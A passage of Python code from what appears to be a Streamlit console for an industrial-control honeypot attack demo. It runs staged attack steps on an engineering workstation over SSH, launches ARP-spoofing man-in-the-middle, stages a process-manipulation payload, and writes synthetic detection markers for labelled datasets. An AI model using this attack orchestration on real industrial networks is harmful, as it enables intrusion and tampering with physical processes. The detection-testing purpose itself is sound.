        return -1, f"[SSH ERROR] {exc.__class__.__name__}: {detail}"


def run_remote_capture(command: str, timeout: int, use_pty: bool = False) -> Tuple[int, str]:
    return run_remote_capture_with_credentials(
        st.session_state.ews_host,
        st.session_state.ews_user,
        st.session_state.ews_password,
        command,
        timeout,
        use_pty,
    )


def powershell_encoded_command(script: str) -> str:
    encoded = base64.b64encode(script.encode("utf-16le")).decode("ascii")
    return f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}"


def sanitize_windows_token(value: str) -> str:
    # Normalize common pasted shell escaping (e.g. \"...\") and trim wrapping quotes.
    cleaned = (value or "").strip()
    cleaned = cleaned.replace('\\"', '"').replace("\\'", "'")
    if cleaned.startswith('"') and cleaned.endswith('"') and len(cleaned) >= 2:
        cleaned = cleaned[1:-1].strip()
    if cleaned.startswith("'") and cleaned.endswith("'") and len(cleaned) >= 2:
        cleaned = cleaned[1:-1].strip()
    return cleaned


def execute_command(command: str, exec_mode: str, timeout: int, use_pty: bool = False) -> Tuple[int, str]:
    command = (command or "").strip()
    if not command:
        return -1, "[INPUT ERROR] Command is empty."

    if exec_mode == "local":
        try:
            proc = subprocess.run(
                ["bash", "-lc", command],
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            rc = proc.returncode
            output = ((proc.stdout or "") + ("\n" + proc.stderr if proc.stderr else "")).strip() or "(no output)"
            return rc, output
        except subprocess.TimeoutExpired:
            return -1, f"[LOCAL ERROR] command timed out after {timeout}s"

    ok, msg = ssh_credentials_ready()
    if not ok:
        return -1, f"[INPUT ERROR] {msg}"
    return run_remote_capture(command, timeout, use_pty=use_pty)


def set_command_result(buffer_key: str, command: str, output: str, rc: int, target_label: str | None = None) -> None:
    prefix = f"[target: {target_label}]\n" if target_label else ""
    st.session_state.buffers[buffer_key] = f"{prefix}$ {command}\n\n{output}\n\n[exit code: {rc}]\n"
    st.session_state.last_exit[buffer_key] = rc


def start_step(step: AttackStep, command_override: str | None = None) -> None:
    step_key = f"step_{step.idx}"
    inject_markers = synthetic_markers_requested()
    st.session_state.running[step_key] = True
    command_to_run = (command_override or step.command_exec).strip() or step.command_exec
    stage_output = ""
    step_start_ts = time.time()
    if step.idx == 8:
        remote_path = st.session_state.get("manipulate_script", MANIPULATE_SCRIPT).strip() or MANIPULATE_SCRIPT
        stage_start_ts = time.time()
        stage_rc, stage_msg = stage_remote_manipulation_payload(remote_path)
        stage_end_ts = time.time()
        if stage_rc != 0:
            set_command_result(step_key, f"[stage] {remote_path}", stage_msg, stage_rc)
            append_streamlit_session_record(
                metadata={
                    "scenario_step": "step_8_stage_payload",
                    "attack_label": "impact",
                    "attack_stage": "host_command",
                    "asset_class": "ews",
                    "mitre_technique": "T0831",
                    "source_asset": "monitoring_laptop",
                    "target_asset": "ews",
                    "event_kind": "file_stage",
                },
                command=f"[stage] {remote_path}",
                output=stage_msg,
                exit_code=stage_rc,
                start_ts=stage_start_ts,
                end_ts=stage_end_ts,
            )
            publish_current_streamlit_session_to_ml()
            st.session_state.running[step_key] = False
            return
        append_streamlit_session_record(
            metadata={
                "scenario_step": "step_8_stage_payload",
                "attack_label": "impact",
                "attack_stage": "host_command",
                "asset_class": "ews",
                "mitre_technique": "T0831",
                "source_asset": "monitoring_laptop",
                "target_asset": "ews",
                "event_kind": "file_stage",
            },
            command=f"[stage] {remote_path}",
            output=stage_msg,
            exit_code=stage_rc,
            start_ts=stage_start_ts,
            end_ts=stage_end_ts,
        )
        stage_output = f"[payload staging]\n{stage_msg}\n\n"
    rc, output = execute_command(command_to_run, step.exec_mode, step.timeout)
    step_end_ts = time.time()
    if stage_output:
        output = stage_output + output
    if step.idx == 3 and inject_markers:
        smb_marker_out = emit_smb_browse_marker()
        if rc != 0:
            smb_marker_out = "[DEMO MARKER NOTICE] step command failed; emitting fallback session marker.\n" + smb_marker_out
        if smb_marker_out.strip():
            output = output + "\n\n" + smb_marker_out
    if step.idx == 4 and inject_markers:
        endpoint_marker_out = emit_endpoint_markers()
        if endpoint_marker_out.strip():
            output = output + "\n\n" + endpoint_marker_out
    if step.idx == 5 and inject_markers:
        web_marker_out = emit_historian_web_marker()
        if rc != 0:
            web_marker_out = "[DEMO MARKER NOTICE] step command failed; emitting fallback session marker.\n" + web_marker_out
        if web_marker_out.strip():
            output = output + "\n\n" + web_marker_out
    if step.idx == 6 and inject_markers:
        opc_probe_marker_out = emit_opcua_probe_marker()
        if rc != 0:
            opc_probe_marker_out = "[DEMO MARKER NOTICE] step command failed; emitting fallback session marker.\n" + opc_probe_marker_out
        if opc_probe_marker_out.strip():
            output = output + "\n\n" + opc_probe_marker_out
    if step.idx == 8 and inject_markers:
        marker_out = emit_demo_markers(opcua_critical=True, ingest_anomaly=True)
        if rc != 0:
            marker_out = "[DEMO MARKER NOTICE] step command failed; emitting fallback session marker.\n" + marker_out
        if marker_out.strip():
            output = output + "\n\n" + marker_out
    append_streamlit_session_record(
        metadata=streamlit_step_metadata(step.idx),
        command=command_to_run,
        output=output,
        exit_code=rc,
        start_ts=step_start_ts,
        end_ts=step_end_ts,
    )
    publish_current_streamlit_session_to_ml()
    set_command_result(step_key, command_to_run, output, rc)
    st.session_state.running[step_key] = False


def start_variant(variant: AttackVariant, command_override: str | None = None) -> None:
    variant_key = f"variant_{variant.key}"
    st.session_state.running[variant_key] = True
    command_to_run = (command_override or variant.command_exec).strip() or variant.command_exec
    start_ts = time.time()
    rc, output = execute_command(command_to_run, variant.exec_mode, variant.timeout)
    append_streamlit_session_record(
        metadata=streamlit_variant_metadata(variant.key),
        command=command_to_run,
        output=output,
        exit_code=rc,
        start_ts=start_ts,
        end_ts=time.time(),
    )
    publish_current_streamlit_session_to_ml()
    set_command_result(variant_key, command_to_run, output, rc)
    st.session_state.running[variant_key] = False


def run_custom_command() -> None:
    step_key = "custom_runner"
    st.session_state.running[step_key] = True
    exec_mode = st.session_state.get("custom_exec_mode", "ews")
    timeout = int(st.session_state.get("custom_timeout", 90))
    use_pty = bool(st.session_state.get("custom_use_pty", False))
    command = st.session_state.get("custom_command_input", "")
    start_ts = time.time()
    rc, output = execute_command(command, exec_mode, timeout, use_pty=use_pty)
    append_streamlit_session_record(
        metadata=streamlit_custom_command_metadata(command, exec_mode),
        command=command,
        output=output,
        exit_code=rc,
        start_ts=start_ts,
        end_ts=time.time(),
    )
    publish_current_streamlit_session_to_ml()
    target_label = "local attacker shell" if exec_mode == "local" else f"{st.session_state.ews_user}@{st.session_state.ews_host}"
    set_command_result(step_key, command, output, rc, target_label=target_label)
    st.session_state.running[step_key] = False


def start_mitm(step_idx: int) -> None:
    step_key = f"step_{step_idx}"
    inject_markers = synthetic_markers_requested()
    ok, msg = ssh_credentials_ready()
    if not ok:
        st.session_state.buffers[step_key] = f"[INPUT ERROR] {msg}\n"
        st.session_state.last_exit[step_key] = -1
        return
    t1 = sanitize_windows_token(st.session_state.get("arpspoof_target_1", ARPSPOOF_TARGET_1)) or ARPSPOOF_TARGET_1
    t2 = sanitize_windows_token(st.session_state.get("arpspoof_target_2", ARPSPOOF_TARGET_2)) or ARPSPOOF_TARGET_2
    iface = sanitize_windows_token(st.session_state.get("arpspoof_iface", ARPSPOOF_IFACE)) or ARPSPOOF_IFACE
    exe = sanitize_windows_token(st.session_state.get("arpspoof_path", ARPSPOOF_PATH)) or ARPSPOOF_PATH
    st.session_state.arpspoof_target_1 = t1
    st.session_state.arpspoof_target_2 = t2
    st.session_state.arpspoof_iface = iface
    st.session_state.arpspoof_path = exe
    list_cmd = 'cmd /c "C:\\Users\\john\\Downloads\\arpspoof.exe --list"'
    rc_list, out_list = run_remote_capture(list_cmd, 30, use_pty=True)
    remote_runtime_log = r"C:\Users\john\AppData\Local\Temp\arpspoof_runtime.log"
    remote_cmd = build_arpspoof_managed_launch(exe, iface, t1, t2, remote_runtime_log)
    log_path = Path("/tmp") / f"streamlit-mitm-{int(time.time())}.log"
    mitm_start_ts = time.time()
    try:
        with open(log_path, "w", encoding="utf-8") as log_fh:
            proc = subprocess.Popen(
                [
                    "sshpass",
                    "-p",
                    st.session_state.ews_password,
                    "ssh",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "UserKnownHostsFile=/dev/null",
                    f"{st.session_state.ews_user}@{st.session_state.ews_host}",
                    remote_cmd,
                ],
                stdout=log_fh,
                stderr=subprocess.STDOUT,
                text=True,
                start_new_session=True,
            )
        st.session_state.mitm_remote_ssh_pid = proc.pid
        st.session_state.mitm_remote_log = str(log_path)
        launch_note = (
            f"Started managed MITM SSH holder PID={proc.pid}\n"
            f"Remote command: {remote_cmd}\n"
            f"Local log: {log_path}\n"
            f"Remote runtime log: {remote_runtime_log}"
        )
        time.sleep(2)
        check_ps = (
            "$p = Get-Process arpspoof -ErrorAction SilentlyContinue | Select-Object -First 1;"
            "if ($null -eq $p) {"
            "  Write-Output 'ARPSPOOF_NOT_RUNNING';"
            "  exit 1"
            "}"
            "Write-Output ('ARPSPOOF_RUNNING PID=' + $p.Id);"
            "exit 0"
        )
        check_rc, check_output = run_remote_capture(powershell_encoded_command(check_ps), 20, use_pty=True)
        running = check_rc == 0 and "ARPSPOOF_RUNNING" in check_output
        output = launch_note + "\n\n[post-launch status]\n" + check_output
        if running:
            rc = 0
        else:
            rc = 1
            try:
                os.killpg(proc.pid, signal.SIGTERM)
            except ProcessLookupError:
                pass
            st.session_state.mitm_remote_ssh_pid = 0
            output = output + "\nManaged SSH holder stopped because arpspoof was not running on EWS after launch."
    except FileNotFoundError as exc:
        rc = 1
        running = False
        output = f"[LOCAL ERROR] missing launcher dependency: {exc}"
    except Exception as exc:
        rc = 1
        running = False
        output = f"[LOCAL ERROR] failed to start managed MITM SSH holder: {exc}"
    if inject_markers:
        marker_out = emit_demo_markers(opcua_critical=False, ingest_anomaly=False)
        if rc != 0:
            marker_out = "[DEMO MARKER NOTICE] MITM start failed; emitting fallback session marker.\n" + marker_out
        if marker_out.strip():
            output = output + "\n\n" + marker_out
    append_streamlit_session_record(
        metadata=streamlit_step_metadata(step_idx),
        command=remote_cmd,
        output=output,
        exit_code=rc,
        start_ts=mitm_start_ts,
        end_ts=time.time(),
    )
    publish_current_streamlit_session_to_ml()
    st.session_state.buffers[step_key] = (
        f"$ ssh {st.session_state.ews_user}@{st.session_state.ews_host} \"{exe} --list\"\n\n"
        + out_list
        + f"\n\n[exit code: {rc_list}]\n"
        + f"\n$ ssh {st.session_state.ews_user}@{st.session_state.ews_host} \"{remote_cmd}\"\n\n"
        + output
        + f"\n\n[exit code: {rc}]\n"
    )
    st.session_state.last_exit[step_key] = rc
    st.session_state.mitm_running = running


def build_demo_metadata(
    *,
    scenario_step: str,
    attack_label: str,
    attack_stage: str,
    asset_class: str,
    mitre_technique: str,
    source_asset: str,
    target_asset: str,
    event_kind: str = "demo_marker",
    telemetry_origin: str = "synthetic",
) -> Dict[str, str]:
    session_id = get_demo_session_id()
    return {
        "telemetry_origin": telemetry_origin,
        "ground_truth_label": "attack",
        "dataset_split": "attack_labeled",
        "scenario_family": "ics_honeypot_demo",
        "scenario_id": session_id,
        "session_id": session_id,
        "scenario_step": scenario_step,
        "attack_label": attack_label,
        "attack_stage": attack_stage,
        "asset_class": asset_class,
        "mitre_technique": mitre_technique,
        "source_asset": source_asset,
        "target_asset": target_asset,
        "event_kind": event_kind,
        "replay_mode": "streamlit_demo",
    }


def emit_demo_markers(opcua_critical: bool, ingest_anomaly: bool) -> str:
    if not SYNTHETIC_MARKERS_ENABLED:
        return ""
    msgs: List[str] = []
    session_id = get_demo_session_id()
    try:
        uid = f"DEMO100304_{int(time.time())}"
        zeek_event = {
            "ts": time.time(),
            "uid": uid,
            "id.orig_h": "192.168.1.5",
            "id.orig_p": 48900,
            "id.resp_h": "192.168.1.11",
            "id_resp_p": 4840,
            "proto": "tcp",
            "conn_state": "SF",
            "local_orig": True,
            "local_resp": True,
            "missed_bytes": 0,
            "history": "ShADadfF",
            "orig_pkts": 12,
            "orig_ip_bytes": 980,
            "resp_pkts": 10,
            "resp_ip_bytes": 860,
            "ip_proto": 6,
            "detection_id": "100304A",
            "service": "opcua.write_like",
            "critical_target": "true" if opcua_critical else "false",
            "confidence": "high" if opcua_critical else "medium",
            **build_demo_metadata(
                scenario_step="step_8_tag_manipulation",
                attack_label="impact",
                attack_stage="opcua_write",
                asset_class="opcua",
                mitre_technique="T0831",
                source_asset="ews",
                target_asset="opcua_server",
            ),
        }
        wrote, target = write_synthetic_zeek_marker(zeek_event)
        if wrote:
            msgs.append(f"[DEMO MARKER] wrote synthetic Zeek OPC UA event to {target}, session={session_id}.")
    except Exception as exc:
        msgs.append(f"[DEMO MARKER ERROR] zeek marker failed: {exc}")

    if ingest_anomaly:
        try:
            ingest_event = {
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "service": "historian_service",
                "event_type": "ingest_anomaly",
                "src_ip": "192.168.1.5",
                "username": "john",
                "route": "telemetry_sync_cache.py",
                "tag": "weld_cell_temperature_c",
                "status": "high",
                "user_agent": "streamlit-demo",
                **build_demo_metadata(
                    scenario_step="step_8_tag_manipulation",
                    attack_label="impact",
                    attack_stage="process_anomaly",
                    asset_class="historian",
                    mitre_technique="T0831",
                    source_asset="ews",
                    target_asset="historian",
                    event_kind="application_marker",
                ),
            }
            ingest_line = json.dumps(ingest_event, ensure_ascii=True, separators=(",", ":"))
            wrote = False
            try:
                ingest_path = Path(__file__).resolve().parents[1] / "services" / "historian" / "logs" / "ingest.jsonl"
                with open(ingest_path, "a", encoding="utf-8") as fh:
                    fh.write(ingest_line + "\n")
                wrote = True
            except Exception:
                wrote = False

            if not wrote:
                # Fallback for root-owned bind-mounted files: write from ingest container.
                ingest_line_b64 = base64.b64encode(ingest_line.encode("utf-8")).decode("ascii")
                rc = subprocess.run(
                    [
                        "bash",
                        "-lc",
                        (
                            "docker compose --project-directory /home/ceo/honeypot "
                            "-f /home/ceo/honeypot/compose/docker-compose.historian.yml "
                            "exec -T "
                            f"-e DEMO_INGEST_B64='{ingest_line_b64}' "
                            "historian-ingest "
                            "python -c \"import os,base64; "
                            "line=base64.b64decode(os.environ['DEMO_INGEST_B64']).decode('utf-8'); "
                            "open('/var/log/historian/ingest.jsonl','a',encoding='utf-8').write(line+'\\n')\""
                        ),
                    ],
                    capture_output=True,
                    text=True,
                    timeout=12,
                ).returncode
                wrote = rc == 0

            if wrote:
                msgs.append(f"[DEMO MARKER] injected historian ingest_anomaly high event (100209 path), session={session_id}.")
            elif SYNTHETIC_MARKERS_ENABLED:
                msgs.append("[DEMO MARKER ERROR] ingest marker write failed in host and container fallback.")
        except Exception as exc:
            msgs.append(f"[DEMO MARKER ERROR] ingest marker failed: {exc}")

    return "\n".join(msgs)


def emit_smb_browse_marker() -> str:
    if not SYNTHETIC_MARKERS_ENABLED:
        return ""
    try:
        session_id = get_demo_session_id()
        smb_resp = st.session_state.get("smb_target", SMB_TARGET).strip() or SMB_TARGET
        event = {
            "ts": time.time(),
            "uid": f"DEMO100302_{int(time.time())}",
            "id.orig_h": "192.168.1.5",
            "id.orig_p": 54545,
            "id.resp_h": smb_resp,
            "id.resp_p": 445,
            "proto": "tcp",
            "conn_state": "SF",
            "local_orig": True,
            "local_resp": True,
            "missed_bytes": 0,
            "history": "ShADadfF",
            "orig_pkts": 12,
            "orig_ip_bytes": 980,
            "resp_pkts": 10,
            "resp_ip_bytes": 860,
            "ip_proto": 6,
            "service": "smb",
            "share": "Operations",
            **build_demo_metadata(
                scenario_step="step_3_anonymous_smb_browse",
                attack_label="collection",
                attack_stage="smb_access",
                asset_class="smb",
                mitre_technique="T0811",
                source_asset="ews",
                target_asset="smb_server",
            ),
        }
        wrote, target = write_synthetic_zeek_marker(event)
        if wrote:
            return f"[DEMO MARKER] wrote synthetic SMB browse event to {target}, session={session_id}."
        return ""
    except Exception as exc:
        return f"[DEMO MARKER ERROR] smb marker failed: {exc}"


def emit_historian_web_marker() -> str:
    if not SYNTHETIC_MARKERS_ENABLED:
        return ""
    try:
        session_id = get_demo_session_id()
        hist_resp = st.session_state.get("historian_host", HISTORIAN_HOST).strip() or HISTORIAN_HOST
        event = {
            "ts": time.time(),
            "uid": f"DEMO100301_{int(time.time())}",
            "id.orig_h": "192.168.1.5",
            "id.orig_p": 55555,
            "id.resp_h": hist_resp,
            "id.resp_p": 5000,
            "proto": "tcp",
            "conn_state": "SF",
            "local_orig": True,
            "local_resp": True,
            "missed_bytes": 0,
            "history": "ShADadfF",
            "orig_pkts": 12,
            "orig_ip_bytes": 980,
            "resp_pkts": 10,
            "resp_ip_bytes": 860,
            "ip_proto": 6,
            "service": "http",
            "route": "/portal/history",
            "tag": "weld_cell_temperature_c",
            **build_demo_metadata(
                scenario_step="step_5_historian_access",
                attack_label="collection",
                attack_stage="historian_web",
                asset_class="historian",
                mitre_technique="T0802",
                source_asset="ews",
                target_asset="historian",
            ),
        }
        wrote, target = write_synthetic_zeek_marker(event)
        if wrote:
            return f"[DEMO MARKER] wrote synthetic historian web event to {target}, session={session_id}."
        return ""
    except Exception as exc:
        return f"[DEMO MARKER ERROR] historian web marker failed: {exc}"


def emit_opcua_probe_marker() -> str:
    if not SYNTHETIC_MARKERS_ENABLED:
        return ""
    try:
        session_id = get_demo_session_id()
        event = {
            "ts": time.time(),
            "uid": f"DEMO100303_{int(time.time())}",
            "id.orig_h": "192.168.1.5",
            "id.orig_p": 51000,
            "id.resp_h": "192.168.1.11",
            "id.resp_p": 4840,
            "proto": "tcp",
            "conn_state": "SF",
            "local_orig": True,
            "local_resp": True,
            "missed_bytes": 0,
            "history": "ShADadfF",
            "orig_pkts": 8,
            "orig_ip_bytes": 620,
            "resp_pkts": 6,
            "resp_ip_bytes": 540,
            "ip_proto": 6,
            "service": "opcua.probe",
            **build_demo_metadata(
                scenario_step="step_6_opcua_probe",
                attack_label="recon",
                attack_stage="opcua_path",
                asset_class="opcua",
                mitre_technique="T0861",
                source_asset="ews",
                target_asset="opcua_server",
            ),
        }
        wrote, target = write_synthetic_zeek_marker(event)
        if wrote:
            return f"[DEMO MARKER] wrote synthetic OPC UA probe event to {target}, session={session_id}."
        return ""
    except Exception as exc:
        return f"[DEMO MARKER ERROR] opcua probe marker failed: {exc}"


def emit_endpoint_markers() -> str:
    """Inject markers for RDP (100401), SSH (100402), and command execution (100403) on EWS endpoint."""
    if not SYNTHETIC_MARKERS_ENABLED:
        return ""
    msgs: List[str] = []
    session_id = get_demo_session_id()
    
    markers_data = [
        (
            "100401",
            "RDP session initiated on EWS endpoint.",
            {
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
                "rule": {
                    "level": 7,
                    "description": "RDP session initiated on EWS endpoint.",
                    "id": "100401",
                    "firedtimes": 1,
                    "mail": False,
                    "groups": ["rdp", "session", "endpoint"],
                },
                "agent": {"id": "004", "name": "EWS-WIN11", "ip": "192.168.1.5"},
                "manager": {"name": "wazuh.manager"},
                "data": {
                    "event_id": "4778",
                    "logon_type": "10",
                    "user": "john",
                    "computer": "EWS-WIN11",
                    **build_demo_metadata(
                        scenario_step="step_4_ews_access_rdp",
                        attack_label="lateral_movement",
                        attack_stage="host_activity",
                        asset_class="ews",
                        mitre_technique="T0866",
                        source_asset="level35_jump_host",
                        target_asset="ews",
                    ),
                },
            },
        ),
        (
            "100402",
            "SSH session initiated on EWS endpoint.",
            {
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
                "rule": {
                    "level": 7,
                    "description": "SSH session initiated on EWS endpoint.",
                    "id": "100402",
                    "firedtimes": 1,
                    "mail": False,
                    "groups": ["ssh", "session", "endpoint"],
                },
                "agent": {"id": "004", "name": "EWS-WIN11", "ip": "192.168.1.5"},
                "manager": {"name": "wazuh.manager"},
                "data": {
                    "event_id": "4624",
                    "logon_type": "11",
                    "logon_process": "sshd",
                    "user": "john",
                    "computer": "EWS-WIN11",
                    **build_demo_metadata(
                        scenario_step="step_4_ews_access_ssh",
                        attack_label="lateral_movement",
                        attack_stage="host_activity",
                        asset_class="ews",
                        mitre_technique="T0866",
                        source_asset="level35_jump_host",
                        target_asset="ews",
                    ),
                },
            },
        ),
        (
            "100403",
            "Suspicious process execution detected on EWS endpoint.",
            {
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
                "rule": {
                    "level": 8,
                    "description": "Suspicious process execution detected on EWS endpoint.",
                    "id": "100403",
                    "firedtimes": 1,
                    "mail": False,
                    "groups": ["process", "execution", "endpoint", "suspicious"],
                },
                "agent": {"id": "004", "name": "EWS-WIN11", "ip": "192.168.1.5"},
                "manager": {"name": "wazuh.manager"},
                "data": {
                    "image": "C:\\Windows\\System32\\cmd.exe",
                    "command_line": "cmd.exe /c whoami",
                    "user": "EWS-WIN11\\john",
                    "computer": "EWS-WIN11",
                    "event_type": "process_creation",
                    **build_demo_metadata(
                        scenario_step="step_4_ews_command_execution",
                        attack_label="execution",
                        attack_stage="host_command",
                        asset_class="ews",
                        mitre_technique="T1059",
                        source_asset="ews",
                        target_asset="ews",
                    ),
                },
            },
        ),
    ]
    
    for rule_id, desc, alert_dict in markers_data:
        try:
            wrote, target = write_synthetic_wazuh_alert(alert_dict)
            if wrote:
                msgs.append(f"[DEMO MARKER] wrote synthetic {desc} ({rule_id}) to {target}, session={session_id}.")
        except Exception as exc:
            msgs.append(f"[DEMO MARKER ERROR] rule {rule_id} failed: {exc}")
    
    return "\n".join(msgs)


def check_remote_mitm_status(step_idx: int) -> None:
    step_key = f"step_{step_idx}"
    ok, msg = ssh_credentials_ready()
    if not ok:
        st.session_state.buffers[step_key] = st.session_state.buffers.get(step_key, "") + f"\n[INPUT ERROR] {msg}\n"
        st.session_state.last_exit[step_key] = -1
        return
    check_ps = (
        "$p = Get-Process arpspoof -ErrorAction SilentlyContinue | Select-Object -First 1;"
        "if ($null -eq $p) {"
        "  Write-Output 'arpspoof.exe is NOT running on EWS';"
        "  exit 1"
        "}"
        "Write-Output ('arpspoof.exe is running on EWS with PID=' + $p.Id);"
        "exit 0"
    )
    cmd = powershell_encoded_command(check_ps)
    rc, output = run_remote_capture(cmd, 20, use_pty=True)
    local_note = ""
    ssh_pid = int(st.session_state.get("mitm_remote_ssh_pid", 0) or 0)
    if ssh_pid > 0:
        try:
            os.kill(ssh_pid, 0)
            local_note = f"managed SSH holder PID={ssh_pid} is alive"
        except OSError:
            local_note = f"managed SSH holder PID={ssh_pid} has already exited; remote process status below is authoritative"
    if st.session_state.get("mitm_remote_log"):
        local_note = (local_note + "\n" if local_note else "") + f"log={st.session_state.mitm_remote_log}"
    st.session_state.buffers[step_key] = (
        st.session_state.buffers.get(step_key, "")
        + "\n$ ssh john@192.168.1.5 \"powershell -NoProfile -Command \\\"Get-Process arpspoof\\\"\"\n\n"
        + (local_note + "\n\n" if local_note else "")
        + output
        + f"\n\n[exit code: {rc}]\n"
    )
    st.session_state.last_exit[step_key] = rc
    st.session_state.mitm_running = rc == 0


def stop_mitm(step_idx: int) -> None:
    step_key = f"step_{step_idx}"
    ok, msg = ssh_credentials_ready()
    if not ok:
        st.session_state.buffers[step_key] = st.session_state.buffers.get(step_key, "") + f"\n[INPUT ERROR] {msg}\n"
        st.session_state.last_exit[step_key] = -1
        return
    cmd = 'cmd /c "taskkill /F /IM arpspoof.exe"'
    rc, output = run_remote_capture(cmd, 30)
    ssh_pid = int(st.session_state.get("mitm_remote_ssh_pid", 0) or 0)
    local_note = ""
    if ssh_pid > 0:
        try:
            os.killpg(ssh_pid, signal.SIGTERM)
            local_note = f"\nmanaged SSH holder PID={ssh_pid} terminated"
        except ProcessLookupError:
            local_note = f"\nmanaged SSH holder PID={ssh_pid} was already stopped"
        st.session_state.mitm_remote_ssh_pid = 0
    st.session_state.buffers[step_key] = (
        st.session_state.buffers.get(step_key, "")
        + "\n$ ssh john@192.168.1.5 \"taskkill /F /IM arpspoof.exe\"\n\n"
        + output
        + local_note
        + f"\n\n[exit code: {rc}]\n"
    )
    st.session_state.last_exit[step_key] = rc
    if rc in (0, 128):
        st.session_state.mitm_running = False


def capture_arp_before() -> None:
    ok, msg = historian_ssh_credentials_ready()
    if not ok:
        st.session_state.arp_before = f"[INPUT ERROR] {msg}"
        return
    host = st.session_state.get("historian_host", HISTORIAN_HOST).strip() or HISTORIAN_HOST
    user = st.session_state.get("historian_ssh_user", "").strip()
    password = st.session_state.get("historian_ssh_password", "")
    cmd = (
        "hostname && ip -br addr && "
        "echo '--- ip neigh ---' && ip neigh && "
        "if command -v arp >/dev/null 2>&1; then echo '--- arp -n ---' && arp -n; else echo '--- arp -n ---' && echo 'arp command not installed'; fi"
    )
    rc, out = run_remote_capture_with_credentials(host, user, password, cmd, timeout=20)
    st.session_state.arp_before = f"[historian ssh: {user}@{host}]\n{out}\n\n[exit code: {rc}]"


def capture_arp_after() -> None:
    ok, msg = historian_ssh_credentials_ready()
    if not ok:
        st.session_state.arp_after = f"[INPUT ERROR] {msg}"
        return
    host = st.session_state.get("historian_host", HISTORIAN_HOST).strip() or HISTORIAN_HOST
    user = st.session_state.get("historian_ssh_user", "").strip()
    password = st.session_state.get("historian_ssh_password", "")
    cmd = (
        "hostname && ip -br addr && "
        "echo '--- ip neigh ---' && ip neigh && "
        "if command -v arp >/dev/null 2>&1; then echo '--- arp -n ---' && arp -n; else echo '--- arp -n ---' && echo 'arp command not installed'; fi"
    )
    rc, out = run_remote_capture_with_credentials(host, user, password, cmd, timeout=20)
    st.session_state.arp_after = f"[historian ssh: {user}@{host}]\n{out}\n\n[exit code: {rc}]"


def run_evidence_bundle(step_idx: int) -> None:
    zeek_cmd = 'grep -E "\"(445|5000|4840)\"|100304A|100307A|discovery_scan" /home/ceo/zeek_feed.log | tail -30 || true'
    wazuh_cmd = (
        "docker exec single-node-wazuh.manager-1 sh -c "
        "'tail -n 2000 /var/ossec/logs/alerts/alerts.json | "
        "grep -E \"100301|100302|100303|100304|100305|100306|100307|100401|100402|100403|100404|100405|100406|100209\"' || true"
    )
    zeek_out = run_local(zeek_cmd, timeout=10)
    wazuh_out = run_local(wazuh_cmd, timeout=20)
    st.session_state.evidence_out[step_idx] = (
        "[Zeek evidence]\n"
        + zeek_out
        + "\n\n[Wazuh evidence]\n"
        + wazuh_out
    )


def run_variant_evidence_bundle(variant_key: str) -> None:
    zeek_cmd = (
        "tail -n 60 /home/ceo/zeek_feed.log 2>/dev/null"
    )
    wazuh_cmd = (
        "docker exec single-node-wazuh.manager-1 sh -c "
        "'tail -n 2500 /var/ossec/logs/alerts/alerts.json | "
        "grep -E \"100301|100302|100303|100304|100305|100306|100307|100401|100402|100403|100404|100405|100406|100209|18[0-9]{3}|92[0-9]{3}|60[0-9]{3}\"' || true"
    )
    loki_cmd = (
        "for rid in 100301 100302 100303 100304 100305 100306 100307 100402 100404 100405 100406 100209; do "
        "echo \"RULE=$rid\"; "
        "curl -sG http://localhost:3100/loki/api/v1/query_range "
        "--data-urlencode \"query={job=\\\"wazuh\\\",rule_id=\\\"$rid\\\"}\" "
        "--data-urlencode \"start=$(date -u -d '15 minutes ago' +%s%N)\" "
        "--data-urlencode \"end=$(date -u +%s%N)\" "
        "--data-urlencode 'limit=1'; echo; "
        "done"
    )
    zeek_out = run_local(zeek_cmd, timeout=15)
    wazuh_out = run_local(wazuh_cmd, timeout=20)
    loki_out = run_local(loki_cmd, timeout=30)
    st.session_state.evidence_out[variant_key] = (
        "[Zeek evidence]\n"
        + zeek_out
        + "\n\n[Wazuh evidence]\n"
        + wazuh_out
        + "\n\n[Loki evidence]\n"
        + loki_out
    )


def collect_mitm_evidence() -> str:
    t1 = st.session_state.get("arpspoof_target_1", ARPSPOOF_TARGET_1).strip() or ARPSPOOF_TARGET_1
    t2 = st.session_state.get("arpspoof_target_2", ARPSPOOF_TARGET_2).strip() or ARPSPOOF_TARGET_2
    arp_out = run_local(
        f"if command -v arp >/dev/null 2>&1; then arp -n | grep -E '{t1}|{t2}' || true; else echo 'arp command not installed'; fi",
        timeout=8,
    )
    neigh_out = run_local(f"ip neigh | grep -E '{t1}|{t2}' || true", timeout=8)
    remote_out = "(remote check skipped: missing SSH credentials)"
    if ssh_credentials_ready()[0]:
        check_ps = (
            "$p = Get-Process arpspoof -ErrorAction SilentlyContinue | Select-Object -First 1;"
            "if ($null -eq $p) {"
            "  Write-Output 'ARPSPOOF_NOT_RUNNING';"
            "  return"
            "}"
            "Write-Output ('ARPSPOOF_RUNNING PID=' + $p.Id);"
        )
        _, out_remote = run_remote_capture(powershell_encoded_command(check_ps), 20, use_pty=True)
        if "ARPSPOOF_RUNNING" in out_remote:
            remote_out = out_remote.replace("ARPSPOOF_RUNNING", "arpspoof.exe is running on EWS with") + "\n[exit code: 0]"
        else:
            remote_out = out_remote.replace("ARPSPOOF_NOT_RUNNING", "arpspoof.exe is NOT running on EWS") + "\n[exit code: 1]"

    hist_host = st.session_state.get("historian_host", HISTORIAN_HOST).strip() or HISTORIAN_HOST
    hist_user = st.session_state.get("historian_ssh_user", "").strip()
    hist_password = st.session_state.get("historian_ssh_password", "")
    peer = t2 if t1 == hist_host else t1
    if hist_user and hist_password:
        victim_cmd = (
            "hostname && "
            + f"echo 'peer={peer}' && "
            + f"echo '--- ip neigh peer ---' && ip neigh show {peer} 2>/dev/null || true; "
            + "if command -v arp >/dev/null 2>&1; then "
            + f"echo '--- arp -n peer ---' && arp -n | grep -E '^{peer}[[:space:]]' || true; "
            + "else echo '--- arp -n peer ---' && echo 'arp command not installed'; fi"
        )
        rc_hist, out_hist = run_remote_capture_with_credentials(hist_host, hist_user, hist_password, victim_cmd, timeout=20)
        victim_out = f"{hist_host} -> {peer} [exit {rc_hist}]\n{out_hist}"
    else:
